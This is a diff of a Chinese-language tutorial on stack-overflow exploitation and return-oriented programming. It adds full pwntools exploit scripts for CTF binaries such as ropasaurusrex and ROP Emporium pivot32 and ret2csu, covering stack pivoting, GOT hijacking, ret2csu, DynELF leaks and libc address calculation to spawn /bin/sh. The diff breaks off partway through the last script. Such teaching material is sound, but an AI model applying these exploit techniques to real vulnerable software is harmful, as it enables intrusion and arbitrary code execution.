@@ -11,15 +11,18 @@
 - ret2reg
 - ret2csu
 - stack pivot
-- ret2dl-resolve & DynELF
+- ret2dl-resolve
 - JOP/COP
+- 利用infoleak绕过ASLR
+- rop构造infoleak绕过ASLR两次溢出
 - rop & got hijack
 - rop & one-gadget
 - rop构造binsh字符串到bss
 - rop & mmap/mprotect绕过NX
-- rop & fuzz爆破绕过ASLR
-- 利用infoleak绕过ASLR
-- rop构造infoleak绕过ASLR
+- ret2dl-resolve & DynELF
+- FUZZ爆破
+- infoleak绕过PIE
+- FUZZ爆破绕过PIE(x86)
 - CANARY绕过
 
 
@@ -545,8 +548,6 @@ $2 = {<text variable, no debug info>} 0xf7e339b0 <__GI_exit>
   0xb7f81ff8: "/bin/sh"
   ```
 
-  
-
 - 获取地址的另一种方法
   
   - 首先用ldd命令获取libc基址
@@ -1018,14 +1019,6 @@ p.interactive()
 
 ### 栈迁移(Stack Pivot)
 
-##### 案例1: ropasaurusrex (PlaidCTF 2013)
-
-https://github.com/PHX2600/plaidctf-2013/tree/master/ropasaurusrex
-
-案例同上，前面经过两次溢出完成利用，这里通过栈迁移方式一样可以完成利用。
-
-**栈迁移(Stack Pivot)**
-
 ![img](images/从栈溢出到ROP/stack_pivot1.png)
 
 **定义**
@@ -1040,6 +1033,7 @@ https://github.com/PHX2600/plaidctf-2013/tree/master/ropasaurusrex
 
 **栈迁移："add esp"**
 将esp加上一个固定值的gadget我们称为"add esp"，例如: add esp, 0x6C; ret;
+
 下图将演示栈迁移的过程，从栈溢出函数返回开始。
 
 ![img](images/从栈溢出到ROP/stack_pivot2.png)
@@ -1059,17 +1053,61 @@ https://github.com/PHX2600/plaidctf-2013/tree/master/ropasaurusrex
 
 ![img](images/从栈溢出到ROP/stack_pivot7.png)
 
-**利用：栈迁移**
+> 除了使用 "pop ebp ret" + "leave ret"组合，在栈溢出时，由于覆盖返回地址前还会覆盖保存的ebp，因此实际上不需要pop ebp ret也是能控制ebp的，因此这种情况下，只需使用指定的值覆盖ebp，使用leave ret覆盖返回地址也可以完成栈迁移，布局示意如下：
+>
+> [ AAAA ]
+> [     ...    ]
+> [ AAAA ]
+> [  EBP   ]    // 覆写为目标ebp 为new stack地址
+> [  EIP    ]    // 返回地址覆写为leave ret
+>
+> 这样所溢出覆盖的指令更短，仅覆写8字节(EBP和返回地址)就可以劫持执行流到新栈，然后可以通过新栈上构造的ROP进行进一步利用。详细参考案例2。
+
+##### 案例1: ropasaurusrex (PlaidCTF 2013)
+
+https://github.com/PHX2600/plaidctf-2013/tree/master/ropasaurusrex
+
+案例同上，前面经过两次溢出完成利用，这里通过栈迁移方式一样可以完成利用：
 
 - 第一次ROP，泄露libc地址
-  + 调用write(1, write_got, 4),泄露write函数地址，同方法1
+  + 调用write(1, write_got, 4),泄露write函数地址
   + 调用read(0, new_stack, ROP_len), 读取第二次ROP Payload到bss段(新的栈)
   + 利用栈迁移"pop ebp ret" + "leave ret"，连接执行第二次ROP
 - 读取泄露的write函数地址，计算system()和字符串'/bin/sh'的地址
 - 根据计算出的system和binsh地址，输入第二次的ROP
 - 等待栈迁移触发第二次ROP执行，启动shell
 
-![img](images/从栈溢出到ROP/stack_pivot8.png)
+```
+#!/usr/bin/env python
+from pwn import *
+context(arch='i386', os='linux', endian='little', log_level = 'debug')
+elf = ELF('./ropasaurusrex')
+libc = elf.libc
+p = process(elf.path)
+pop_ebp = 0x080483c3    # pop ebp; ret
+leave_ret = 0x080482ea  # leave ret; <=> mov esp, ebp; pop ebp; ret
+pop3_ret = 0x080484b6
+bss = 0x08049628
+new_stack = bss + 4
+
+payload = b'A' * 0x8c
+# 首先泄露地址，构造ROP调用write(1, write_got, 4)
+payload += p32(elf.plt['write']) + p32(pop3ret) + p32(1) + p32(elf.got['write']) + p32(4)
+# 然后读取第二次ROP到新的栈上，read(0, new_stack, 12)
+payload += p32(elf.plt['read']) + p32(pop3ret) + p32(0) + p32(new_stack) + p32(12)
+# 栈迁移连接第二次ROP: pop ebp ret + leave ret
+payload += p32(popret) + p32(bss) + p32(leaveret)
+p.send(payload)
+# 接收泄露的write函数地址，并且计算system和binsh地址
+write_addr = u32(p.recv(4))
+libcbase = write_addr - libc.sym['write']
+system_addr = libcbase + libc.sym['system']
+binsh_addr = libcbase + next(libc.search(b'/bin/sh\0'))
+# 发送第二次ROP payload：system('/bin/sh')
+p.send(p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr))
+# 等待栈迁移触发第二次ROP执行，启动shell
+p.interactive()
+```
 
 
 
@@ -1078,80 +1116,170 @@ https://github.com/PHX2600/plaidctf-2013/tree/master/ropasaurusrex
   http://ropemporium.com/binary/pivot32.zip
 
 ```
-char *__cdecl pwnme(char *a1)
+int __cdecl pwnme(void *buf)
 {
   char s; // [esp+0h] [ebp-28h]
 
   memset(&s, 0, 0x20u);
-  puts("Call ret2win() from libpivot.so");
-  printf("The Old Gods kindly bestow upon you a place to pivot: %p\n", a1);
-  puts("Send your second chain now and it will land there");
+  puts("Call ret2win() from libpivot");
+  printf("The Old Gods kindly bestow upon you a place to pivot: %p\n", buf);
+  puts("Send a ROP chain now and it will land there");
   printf("> ");
-  fgets(a1, 256, stdin);
-  puts("Now kindly send your stack smash");
+  read(0, buf, 256u);
+  puts("Thank you!\n");
+  puts("Now please send your stack smash");
   printf("> ");
-  return fgets(&s, 58, stdin);
+  read(0, &s, 56u);
+  return puts("Thank you!");
 }
 ```
 
-在该案例中，栈上可用的空间很小，因此必须找到一个方法来到更多的空间，这时候可以利用栈迁移的方法
+在该案例中，栈上可用的空间很小，因此必须找到一个方法来到更多的空间，这时候可以利用栈迁移的方法。针对这题也有不同的解题思路：
 
 ```
-# http://paste.ubuntu.com/prykV4KDzKS/
+# 解法1，按题目原要求实现调用ret2win
+#!/usr/bin/env python
 from pwn import *
-
 context.log_level = 'debug'
-elf = ELF("pivot32")
-libc = elf.libc
-leave_ret = 0x804889e
-
-io = process("./pivot32")
-
-io.recvuntil("The Old Gods kindly bestow upon you a place to pivot:")
-leakaddr = int(io.recvline().strip(),16)
-log.info("leakaddr: 0x%x" % leakaddr)
-
-pay1  = ""
-pay1 += p32(elf.plt['puts'])
-pay1 += p32(0x804873B)  # pwnme() function
-pay1 += p32(elf.got['puts'])
-io.recvuntil(">")
-io.sendline(pay1)
-
+elf = ELF('./pivot32')
+libpivot32 = ELF('libpivot32.so')
+p = process(elf.path)
 pause()
 
-pay2 = "A"*0x28
-pay2 += p32(leakaddr-4) # sae ebp 
-pay2 += p32(leave_ret)  # 
+p.recvuntil(': ')
+new_stack = int(p.recv(10), 16)
+print('new_stack={}'.format(hex(new_stack)))
+pop_ret = 0x0804889b
+leave_ret = 0x080485f5
 
-io.recvuntil(">")
-io.sendline(pay2)
-# leak
-puts_addr = u32(io.recvn(5)[1:])
-libc_base = puts_addr - libc.sym['puts']
-system_addr = libc_base + libc.sym['system']
-binsh_addr = libc_base + libc.search("/bin/sh\x00").next()
-log.info("puts_addr: 0x%x" % puts_addr)
-log.info("system_addr: 0x%x" % system_addr)
+p.recvuntil('> ')
+payload = p32(elf.plt['foothold_function'])   # 由于延迟绑定机制，先调用一次目标函数保证GOT项写入
+payload += p32(elf.plt['puts'])               # 调用puts泄露foothold_function@got
+payload += p32(pop_ret)
+payload += p32(elf.got['foothold_function'])
+payload += p32(elf.plt['read'])               # 调用read写入ret2win地址
+payload += p32(0xdeadbeef)                    # 返回地址占位符，将被改写为ret2win地址
+payload += p32(0)
+payload += p32(new_stack + 20)                # 刚好指向0xdeadbeef占位符地址
+payload += p32(4)
+p.send(payload)
 
-io.recvuntil("The Old Gods kindly bestow upon you a place to pivot:")
-leakaddr = int(io.recvline().strip(),16)
-log.info("leakaddr: 0x%x" % leakaddr)
-pay3 = p32(system_addr)
-pay3 += "AAAA"
-pay3 += p32(binsh_addr)
+# 溢出16字节进行栈迁移到上面构造的ROP链
+p.recvuntil('> ')
+payload = b'A' * 0x28
+payload += p32(new_stack - 4)                 # saved ebp
+payload += p32(leave_ret)                     # mov esp, ebp; pop ebp
+p.send(payload)
 
-io.recvuntil(">")
-io.sendline(pay3)
+# 读取leak出的foothold_function@got地址，计算ret2win地址，并写入
+p.recvuntil('libpivot\n')
+foothold = u32(p.recv(4))
+print('foothold={}'.format(hex(foothold)))
+libbase = foothold - libpivot32.sym['foothold_function']
+ret2win = libbase + libpivot32.sym['ret2win']
+p.send(p32(ret2win))
 
-pay2 = "A"*0x28
-pay2 += p32(leakaddr-4)
-pay2 += p32(leave_ret)
+p.interactive()
+```
 
-io.recvuntil(">")
-io.sendline(pay2)
 
-io.interactive()
+
+```
+# 解法2，扩展一下，可以直接执行system('/bin/sh')
+#!/usr/bin/env python
+from pwn import *
+elf = ELF('./pivot32')
+libc = elf.libc
+p = process(elf.path)
+pause()
+
+pop3_ret = 0x08048899
+pop_ret = 0x0804889b
+leave_ret = 0x080485f5
+p.recvuntil(': ')
+new_stack = int(p.recv(10), 16)
+print('new_stack={}'.format(hex(new_stack)))
+p.recvuntil('> ')
+payload = p32(elf.plt['puts'])
+payload += p32(pop_ret)
+payload += p32(elf.got['puts'])
+payload += p32(elf.plt['read'])
+payload += p32(pop3_ret)
+payload += p32(0)
+payload += p32(new_stack + 32)
+payload += p32(12)
+p.send(payload)
+
+p.recvuntil('> ')
+payload = b'A' * 0x28
+payload += p32(new_stack - 4) # saved ebp
+payload += p32(leave_ret)     # mov esp, ebp; pop ebp
+p.send(payload)
+p.recvuntil('Thank you!\n')
+puts_addr = u32(p.recv(4))
+print('puts_addr={}'.format(hex(puts_addr)))
+libbase = puts_addr - libc.sym['puts']
+system_addr = libbase + libc.sym['system']
+binsh_addr = libbase + next(libc.search(b'/bin/sh\0'))
+p.send(p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr))
+
+p.interactive()
+```
+
+```
+# 解法3，采用两次溢出方法执行system('/bin/sh')
+#!/usr/bin/env python
+from pwn import *
+elf = ELF('./pivot32')
+libc = elf.libc
+p = process(elf.path)
+pause()
+
+pop_ebp = 0x0804889b
+leave_ret = 0x080485f5
+main = 0x08048686
+
+p.recvuntil(': ')
+new_stack = int(p.recv(10), 16)
+print('new_stack={}'.format(hex(new_stack)))
+p.recvuntil('> ')
+payload = p32(0)
+payload += p32(elf.plt['puts'])
+payload += p32(main)
+payload += p32(elf.got['puts'])
+p.send(payload)
+
+p.recvuntil('> ')
+payload = b'A' * (0x28 + 4)
+payload += p32(pop_ebp)
+payload += p32(new_stack)
+payload += p32(leave_ret)  # mov esp, ebp; pop ebp
+p.send(payload)
+
+p.recvuntil('Thank you!\n')
+puts_addr = u32(p.recv(4))
+print('puts_addr={}'.format(hex(puts_addr)))
+libbase = puts_addr - libc.sym['puts']
+system_addr = libbase + libc.sym['system']
+binsh_addr = libbase + next(libc.search(b'/bin/sh\0'))
+
+p.recvuntil(': ')
+new_stack = int(p.recv(10), 16)
+print('new_stack={}'.format(hex(new_stack)))
+p.recvuntil('> ')
+payload = p32(0)
+payload += p32(system_addr)
+payload += p32(0xdeadbeef)
+payload += p32(binsh_addr)
+p.send(payload)
+
+p.recvuntil('> ')
+payload = b'A' * (0x28)
+payload += p32(new_stack)
+payload += p32(leave_ret)  # mov esp, ebp; pop ebp
+p.send(payload)
+
+p.interactive()
 ```
 
 
@@ -1160,29 +1288,60 @@ io.interactive()
 
 **思路**
 
+  + 在前面描述的ROP一般构造思路中，先利用ROP泄露libc地址，然后计算system地址，再布置新的ROP调用system()
   + 上述方法中，我们需要执行两次ROP，第二次ROP Payload依赖第一次ROP泄露的地址，能否只用一次ROP就完成利用？
-
   + 在ROP中通过return to PLT调用read和write，实际上可以实现内存任意读写
-
   + 因此，为了最终执行system()我们可以不使用ROP，而是使用GOT表劫持的方法：先通过ROP调用read，来修改write函数的GOT表项，然后再次write，实际上此时调用的则是GOT表项被劫持后的值，例如system()
 
-    ![img](images/从栈溢出到ROP/got_hijack1.png)
 
 **详细步骤**
 
-  - 使用一次ROP，完成libc地址泄露、GOT表劫持、命令字符串写入
-    + 调用write(1, write_got, 4)，泄露write函数地址，同方法1
-    + 调用read(0, write_got, 4)，修改write()函数的GOT表项为system地址
-    + 调用read(0, bss, len(cmd))，将命令字符串("/bin/sh")写入.bss section
-    + 调用write(cmd)，实际上调用的system(cmd)
-  - 读取泄露的write函数地址，计算system()地址
+使用一次ROP，完成libc地址泄露、GOT表劫持、命令字符串写入
+
+  - 调用write(1, write_got, 4)，泄露write函数地址
+    - 读取泄露的write函数地址，计算system()地址
+    - 调用read(0, write_got, 4)，修改write()函数的GOT表项为system地址
+    - 调用read(0, bss, len(cmd))，将命令字符串("/bin/sh")写入.bss section
+    - 调用write(cmd)，实际上调用的system(cmd)
   - 读取system()地址，修改write()函数的GOT表项
   - 输入命令字符串"/bin/sh"，写入.bss section
   - 调用write(cmd)来运行system(cmd)
 
-![img](images/从栈溢出到ROP/got_hijack2.png)
+**案例 ropasaurusrex (PlaidCTF 2013)**
 
+https://github.com/PHX2600/plaidctf-2013/tree/master/ropasaurusrex
 
+```
+from pwn import *
+context(arch='i386', os='linux', endian='little', log_level = 'debug')
+pop3_ret = 0x080484b6
+bss = 0x08049628
+cmd = b'/bin/sh\0'
+elf = ELF('./ropasaurusrex')
+libc = elf.libc
+p = process(elf.path)
+print('[+] PID: {}'.format(proc.pidof(p)))
+
+payload = b'A' * 0x8c
+# 首先泄露地址,write(1, write_got, 4)
+payload += p32(elf.plt['write']) + p32(pop3_ret) + p32(1) + p32(elf.got['write']) + p32(4)
+# 利用read函数修改write()函数的GOT表项，read(0, write_got, 4)
+payload += p32(elf.plt['read']) + p32(pop3_ret) + p32(0) + p32(elf.got['write']) + p32(4)
+# 利用read函数读取命令字符串，写入.bss section, read(0, bss, len(cmd))
+payload += p32(elf.plt['read']) + p32(pop3_ret) + p32(0) + p32(bss) + p32(len(cmd))
+# 调用write(cmd)，由于write的GOT表项被劫持，实际上调用的system(cmd)
+payload += p32(elf.plt['read']) + p32(0xdeadbeef) + p32(bss)
+p.send(payload)
+# 接收泄露的write函数地址，并计算system地址
+write_addr = u32(p.read(4))
+libc_base = write_addr - libc.sym['write']
+system_addr = libc_base + libc.sym['system']
+print('system_addr={}'.format(system_addr))
+# 发送system函数地址和命令，劫持write函数GOT表项，并写入命令至bss section
+p.send(p32(system_addr) + cmd)
+# 等待执行system(cmd)
+p.interactive()
+```
 
 
 
@@ -1243,6 +1402,20 @@ io.interactive()
 
 https://ropemporium.com/binary/ret2csu.zip
 
+程序需rop构造ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)才能利用成功。
+
+即通过ret2csu构造rdi,rsi,rdx三个寄存器值分别为0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d，再调用ret2win即可。注意这里ret2csu中mov edi, r13d指令只能控制到rdi的低32位，故需要额外找一个pop rdi ; ret的gadget来配合控制rdi完成利用。
+
+同时call qword ptr [r12+rbx*8]我们这里用不到，故需要找一个可以解引用并指向可执行代码的地址赋给r12，来保证这条call指令执行时不报错，参考[网上文章](https://blog.r0kithax.com/ctf/infosec/2020/10/20/rop-emporium-ret2csu-x64.html)找到 0x600e48 这个地址符合条件，看作者查找该地址方法是使用radare2通过一系列搜索和试验得到。该地址解引用后的代码指向如下，刚好符合条件
+
+```
+0x004006b4      4883ec08       sub rsp, 8                  ; [14] -r-x section size 9 named .fini
+0x004006b8      4883c408       add rsp, 8
+0x004006bc      c3             ret
+```
+
+完整利用代码如下：
+
 ```
 #!/usr/bin/env python
 from pwn import *
@@ -1258,6 +1431,7 @@ dereferenceable_addr = 0x600e48  # pointer to an executable location with "sub r
 popret = 0x4006a3                # pop rdi ; ret
 ret2win_plt = elf.plt['ret2win']
 
+p.recvuntil('> ')
 payload = b'A' * 0x28
 
 # ret2csu
@@ -1283,127 +1457,132 @@ payload += p64(popret)
 payload += p64(0xdeadbeefdeadbeef)    # rdi
 payload += p64(ret2win_plt)
 
-p.recvuntil('> ')
 p.send(payload)
 p.recvall()
 p.interactive()
 ```
 
-
+ 
 
 **案例2：ret2csu**
 
 ```
- #undef _FORTIFY_SOURCE
- #include <stdio.h>
- #include <stdlib.h>
- #include <unistd.h>
+//gcc bof.c -fno-stack-protector -no-pie -obof
+#include <unistd.h>
 
- void vulnerable_function() {
-  char buf[128];
-  read(STDIN_FILENO, buf, 512);
- }
-
- int main(int argc, char** argv) {
-  write(STDOUT_FILENO, "Hello, World\n", 13);
-  vulnerable_function();
- }
+int main(int argc, char *argv[])
+{
+        char buf[32];
+        write(1, "PWNME\n", 6);
+        read(0, buf, 256);
+        return 0;
+}
 ```
 
-目标程序代码如上。程序仅仅只有一个栈溢出，要先泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段, 最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。考虑到x64的参数传递约定，需要利用ret2csu构造rop。
-首先构造payload1，利用write()输出write在内存中的地址。注意利用的gadget是`call qword ptr [r12+rbx*8]`，所以这里应该使用write.got的地址而不是write.plt的地址。并且要返回到原程序中重复触发漏洞函数，需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。当我们exp在收到write()在内存中的地址后，就可以计算出system()在内存中的地址了。
+目标程序如上。程序只有一个栈溢出，要先泄露内存信息，找到system()的地址，再构造“/bin/sh”到.bss段, 最后调用system(“/bin/sh”)。原程序使用了write()和read()函数，可以通过write()输出write@got的地址，从而计算出libc.so在内存中的地址。考虑到x64的参数传递约定，需要利用ret2csu构造rop。需构造触发三次溢出：
 
-然后构造payload2，利用read()将system()的地址以及“/bin/sh”读入到.bss段内存中。
+利用write()输出write在内存中的地址。注意利用的gadget是`call qword ptr [r12+rbx*8]`，所以这里应该使用write@got的地址而不是write@plt的地址。并且调用完成后要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。根据泄露的地址就可以计算出system()的地址。
 
-最后构造payload3，调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。最终exp如下：
+然后利用read()将system()的地址以及“/bin/sh”读入到.bss段内存中。system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。
+
+最后调用system()函数执行“/bin/sh”。
+
+> 为什么不用libc里的地址，经过调试可知，这里ret2csu默认只能控制edi，即传入参数得是32位地址，而libc里的地址通常为64位，.bss地址范围符合要求。另外这里system()地址本身也需要写入，通过一次read()调用同时写入"/bin/sh"也比较方便。当然配合pop rdi;ret这样的gadget控制rdi应该也可以实现利用libc中已有的字符串，方法不唯一。
+
+最终exp如下：
 
 ```
 #!/usr/bin/env python
- from pwn import *
+from pwn import *
+#context.log_level = 'debug'
 
- elf = ELF('level5')
- libc = ELF('libc.so.6')
+elf = ELF('./bof')
+libc = elf.libc
+p = process(elf.path)
+#pause()
 
- p = process('./level5')
- #p = remote('127.0.0.1',10001)
+ret2csu_gadget1 = 0x4011e0
+ret2csu_gadget2 = 0x4011f6
+main = 0x401156
+bss = 0x404038
+read_got = elf.got['read']
+write_got = elf.got['write']
 
- got_write = elf.got['write']
- print "got_write: " + hex(got_write)
- got_read = elf.got['read']
- print "got_read: " + hex(got_read)
+# 调用 write@got(1, write@got, 8) leak libc
+payload = b'A' * 40
+payload += p64(ret2csu_gadget2)
+payload += p64(0)  # padding
+payload += p64(0)  # rbx
+payload += p64(1)  # rbp
+payload += p64(1)  # r12, edi
+payload += p64(write_got) # r13, rsi
+payload += p64(8)  # r14, rdx
+payload += p64(write_got)
+payload += p64(ret2csu_gadget1)
+payload += p64(0) * 7 # padding, rbx, rbp, r12, r13, 14, r15
+payload += p64(main)
 
- main = 0x400564
+p.recvuntil('PWNME\n')
+p.send(payload)
+sleep(1)
 
- off_system_addr = libc.symbols['write'] - libc.symbols['system']
- print "off_system_addr: " + hex(off_system_addr)
+write_addr = u64(p.recv(8))
+libbase = write_addr - libc.sym['write']
+system_addr = libbase + libc.sym['system']
+exit_addr = libbase + libc.sym['exit']
+print('write_addr={}'.format(hex(write_addr)))
+print('libbase={}'.format(hex(libbase)))
+print('system_addr={}'.format(hex(system_addr)))
 
- #rdi= edi = r13, rsi = r14, rdx = r15 
- #write(rdi=1, rsi=write.got, rdx=4)
- payload1 = "\x00"*136
- payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
- payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
- payload1 += "\x00"*56
- payload1 += p64(main)
+# 调用 read@got(1, bss, 16) 将system地址和/bin/sh字符串写入bss
+payload = b'A' * 40
+payload += p64(ret2csu_gadget2)
+payload += p64(0)  # padding
+payload += p64(0)  # rbx
+payload += p64(1)  # rbp
+payload += p64(0)  # r12, edi
+payload += p64(bss) # r13, rsi
+payload += p64(16)  # r14, rdx
+payload += p64(read_got)
+payload += p64(ret2csu_gadget1)
+payload += p64(0) * 7 # padding, rbx, rbp, r12, r13, 14, r15
+payload += p64(main)
 
- p.recvuntil("Hello, World\n")
+p.recvuntil('PWNME\n')
+p.send(payload)
+sleep(1)
 
- print "\n#############sending payload1#############\n"
- p.send(payload1)
- sleep(1)
+# 写入system地址和/bin/sh字符串
+p.send(p64(system_addr) + b'/bin/sh\x00')
+sleep(1)
 
- write_addr = u64(p.recv(8))
- print "write_addr: " + hex(write_addr)
+# 调用system('/bin/sh')
+payload = b'A' * 40
+payload += p64(ret2csu_gadget2)
+payload += p64(0)  # padding
+payload += p64(0)  # rbx
+payload += p64(1)  # rbp
+payload += p64(bss+8)  # r12, edi  # /bin/sh地址
+payload += p64(0) # r13, rsi
+payload += p64(0)  # r14, rdx
+payload += p64(bss)
+payload += p64(ret2csu_gadget1)
+payload += p64(0) * 7 # padding, rbx, rbp, r12, r13, 14, r15
+payload += p64(exit_addr)
 
- system_addr = write_addr - off_system_addr
- print "system_addr: " + hex(system_addr)
+p.recvuntil('PWNME\n')
+p.send(payload)
 
- bss_addr=0x601028
-
- p.recvuntil("Hello, World\n")
-
- #rdi= edi = r13, rsi = r14, rdx = r15 
- #read(rdi=0, rsi=bss_addr, rdx=16)
- payload2 = "\x00"*136
- payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
- payload2 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
- payload2 += "\x00"*56
- payload2 += p64(main)
-
- print "\n#############sending payload2#############\n"
- p.send(payload2)
- sleep(1)
-
- p.send(p64(system_addr))
- p.send("/bin/sh\0")
- sleep(1)
-
- p.recvuntil("Hello, World\n")
-
- #rdi= edi = r13, rsi = r14, rdx = r15 
- #system(rdi = bss_addr+8 = "/bin/sh")
- payload3 = "\x00"*136
- payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
- payload3 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
- payload3 += "\x00"*56
- payload3 += p64(main)
-
- print "\n#############sending payload3#############\n"
-
- sleep(1)
- p.send(payload3)
-
- p.interactive()
+p.interactive()
 ```
 
 
 
 **案例3 ret2csu构造mmap/mprotect绕过NX**
 
-看了这么多rop后是不是感觉我们利用rop只是用来执行system有点太不过瘾了？另外网上和msf里有那么多的shellcode难道在默认开启DEP的今天已经没有用处了吗？并不是的，我们可以通过mmap或者mprotect将某块内存改成RWX(可读可写可执行)，然后将shellcode保存到这块内存，然后控制pc跳转过去就可以执行任意的shellcode了，比如说建立一个socket连接等。下面我们就结合上一节中提到的通用gadgets来让程序执行一段shellcode。
+以上例子中基本都是通过rop执行system取得一个shell。事实上还有很多复杂的shellcode可以完成更复杂的功能，比如网上或msf里有很多现成的shellcode，例如通过socket反弹shell等。但是开启NX的情况下，这些shellcode也没法直接用。但是我们可以先构造rop通过mmap或者mprotect将某块内存改成RWX(可读可写可执行)，然后将shellcode保存到这块内存，然后控制pc跳转过去就可以执行任意的shellcode了。
 
-我们测试的目标程序还是上面的level5。在exp中，我们首先用上一篇中提到的_`_libc_csu_init`中的通用gadgets泄露出got_write和_`dl_runtime_resolve`的地址。随后就可以根据偏移量和泄露的地址计算出其他gadgets的地址。
-
-然后我们利用`_dl_runtime_resolve`里的通用gadgets调用mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0),开辟一段RWX的内存在0xbeef0000处。随后我们使用read(rdi=0, rsi=shellcode_addr, rdx=1024),把我们想要执行的shellcode读入到0xbeef0000这段内存中。最后再将指针跳转到shellcode处就可执行我们想要执行的任意代码了。
+我们首先用上一篇中提到的_`_libc_csu_init`中的通用gadgets泄露出got_write和_`dl_runtime_resolve`的地址。随后就可以根据偏移量和泄露的地址计算出其他gadgets的地址。然后我们利用`_dl_runtime_resolve`里的通用gadgets调用mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0),开辟一段RWX的内存在0xbeef0000处。随后我们使用read(rdi=0, rsi=shellcode_addr, rdx=1024),把我们想要执行的shellcode读入到0xbeef0000这段内存中。最后再将指针跳转到shellcode处就可执行我们想要执行的任意代码了。
 
 **Exploit**
 
@@ -1543,84 +1722,53 @@ p.interactive()
 
 **案例: ropasaurusrex (PlaidCTF 2013)**
 
+这里我们采用pwntools提供的DynELF模块来进行内存搜索。首先我们需要实现一个`leak(address)`函数，通过这个函数可以获取到某个地址上最少1 byte的数据。随后将这个函数作为参数再调用`d = DynELF(leak, elf=ELF('./ropasaurusrex'))`就可以对DynELF模块进行初始化了。然后可以通过调用`system_addr = d.lookup('system', 'libc')`来得到libc.so中system()在内存中的地址。
 
-![img](images/从栈溢出到ROP/dynelf1.png)
-
-![img](images/从栈溢出到ROP/dynelf2.png)
-
-**案例: DynELF**
-
-这里我们采用pwntools提供的DynELF模块来进行内存搜索。首先我们需要实现一个`leak(address)`函数，通过这个函数可以获取到某个地址上最少1 byte的数据。leak函数类似如下实现：
-
-```
- def leak(address):
-     payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
-     p.send(payload1)
-     data = p.recv(4)
-     print "%#x => %s" % (address, (data or '').encode('hex'))
- return data
-```
-
-随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF('./level2'))就可以对DynELF模块进行初始化了。然后可以通过调用`system_addr = d.lookup('system', 'libc')`来得到libc.so中system()在内存中的地址。
-
-要注意的是，通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可读写。通过readelf -S level2这个命令就可以获取到bss段的地址了。
-
-```
- $ readelf -S level2
- There are 30 section headers, starting at offset 0x1148:
-
- Section Headers:
-   [Nr] Name Type Addr Off Size ES Flg Lk Inf Al
- ……
-   [23] .got.plt PROGBITS 08049ff4 000ff4 000024 04 WA 0 0 4
-   [24] .data PROGBITS 0804a018 001018 000008 00 WA 0 0 4
-   [25] .bss NOBITS 0804a020 001020 000008 00 WA 0 0 4
-   [26] .comment PROGBITS 00000000 001020 00002a 01 MS 0 0 1
- ……
-```
+要注意的是，通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可读写。通过`readelf -S ropasaurusrex`这个命令就可以获取到bss段的地址了。
 
 整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system(.bss)，执行“/bin/sh”。
 
-**Exploit**
-
 ```
- #!/usr/bin/env python
- from pwn import *
+#!/usr/bin/env python
+from pwn import *
+context(arch='i386', os='linux', endian='little', log_level = 'debug')
+main = 0x804841d
+bss = 0x8049700
+elf = ELF('./ropasaurusrex')
+p = process(elf.path)
+print('[+] PID: {}'.format(proc.pidof(p)))
+# 将栈溢出封装成ROP调用，方便多次触发
+def do_rop(rop):
+   payload = b'A' * 0x8c
+   payload += rop
+   p.send(payload)
 
- elf = ELF('./level2')
- plt_write = elf.symbols['write']
- plt_read = elf.symbols['read']
- vulfun_addr = 0x08048474
+# 任意内存读函数，通过ROP调用write函数将任意地址内存写出，最后回到main，实现反复触发
+def peek(addr):
+   payload = b'A' * 0x8c
+   payload += p32(elf.plt['write']) + p32(main) + p32(1) + p32(addr) + p32(4)
+   p.send(payload)
+   return p.recv(4)
+# 任意内存写函数，通过ROP调用read函数王任意地址内存写入数据，最后回到main，实现反复触发
+def poke(addr, data):
+   payload = b'A' * 0x8c
+   payload += p32(elf.plt['read']) + p32(main) + p32(0) + p32(addr) + p32(len(data))
+   p.send(payload)
+   p.send(data)
+# 将任意内存泄露函数peek传入DynELF
+d = DynELF(peek, elf=elf)
+# DynELF模块可实现任意库中的任意符号解析，例如system
+system = d.lookup("system", "libc.so")
+print('system={}'.format(hex(system)))
+# 将要执行的命令写入.bss section
+poke(bss, '/bin/sh\0')
 
- def leak(address):
-     payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
-     p.send(payload1)
-     data = p.recv(4)
-     print "%#x => %s" % (address, (data or '').encode('hex'))
-     return data
